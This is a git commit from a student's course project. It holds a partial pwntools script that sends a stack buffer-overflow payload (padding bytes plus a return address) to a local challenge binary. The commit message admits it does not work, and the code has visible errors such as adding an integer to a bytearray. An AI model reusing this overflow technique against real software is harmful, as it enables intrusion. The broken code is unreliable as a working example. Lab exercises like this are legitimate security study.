e3bf71d12777bfb85adfc85abc35a31f5633060b
William Mironchuk <wmironchuk@umass.edu>
2022-02-28 16:30:29 -0500

    attempted more on the first chall
    this puts in a large number of arbitrary values that are then sent to
    the program along with the value that the first challenge is located at.
    This system does not yet work

--- chall_1/chall_1.py
+++ chall_1/chall_1.py
@@ -3,13 +3,11 @@ import pwn
 
 pwn.context.clear(arch="amd64")
 
-p = pwn.proccess("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")
+p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")
 
+main_payload = bytearray()
+main_payload += b"a" * 28
+main_payload += b"b" * 4
+main_payload += 0x40127a
 
-def solve_process(buffer_len: int = 0, value_set: Any = None,
-                  value_loc: Any = None) -> None:
-    pass
-
-
-def main():
-    pass
+p.send_line(main_payload)
